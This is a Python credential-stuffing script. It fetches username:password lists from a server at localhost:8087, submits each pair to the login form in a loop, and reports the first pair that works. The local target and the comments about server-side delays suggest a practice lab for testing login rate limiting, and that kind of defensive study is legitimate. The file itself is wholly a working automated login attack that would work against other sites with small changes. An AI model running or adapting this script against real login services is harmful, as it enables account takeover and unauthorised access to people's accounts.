import requests
import time
from tqdm import tqdm
from bs4 import BeautifulSoup

def load_credentials(url):
    response = requests.get(url)
    credentials = []
    for line in response.text.split('\n'):
        if ':' in line:
            username, password = line.strip().split(':')
            credentials.append((username, password))
    return credentials

def main():
    base_url = 'http://localhost:8087'
    
    # Choose which credential list to use
    list_choice = input("Which credential list to use? (1 or 2): ")
    creds_url = f'{base_url}/credentials{list_choice}.txt'
    
    print("\nLoading credentials...")
    # Store the credentials we get from the server
    stored_credentials = load_credentials(creds_url)
    print(f"Loaded {len(stored_credentials)} credential pairs")
    
    # Create a session to maintain cookies
    session = requests.Session()
    
    # Setup progress bar
    pbar = tqdm(stored_credentials, desc="Testing credentials")
    
    try:
        for username, password in pbar:
            # Try to login with credentials from the stored list
            response = session.post(f'{base_url}/', data={
                'username': username,
                'password': password
            })
            
            # Extract server message
            soup = BeautifulSoup(response.text, 'html.parser')
            alerts = soup.find_all('div', class_='alert')
            for alert in alerts:
                if 'alert-danger' in alert.get('class', []) or 'alert-success' in alert.get('class', []):
                    print(f"\nServer: {alert.text.strip()}")
                elif 'alert-warning' in alert.get('class', []):  # Also show delay warnings
                    print(f"\nWarning: {alert.text.strip()}")
            
            # Check if login was successful
            if "Login successful" in response.text:
                print(f"\nSuccess! Found working credentials:")
                print(f"Username: {username}")
                print(f"Password: {password}")
                break
            
            # Let the server control the delay
            # We don't need our own delay anymore since the server implements it
            
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
    
if __name__ == "__main__":
    main() 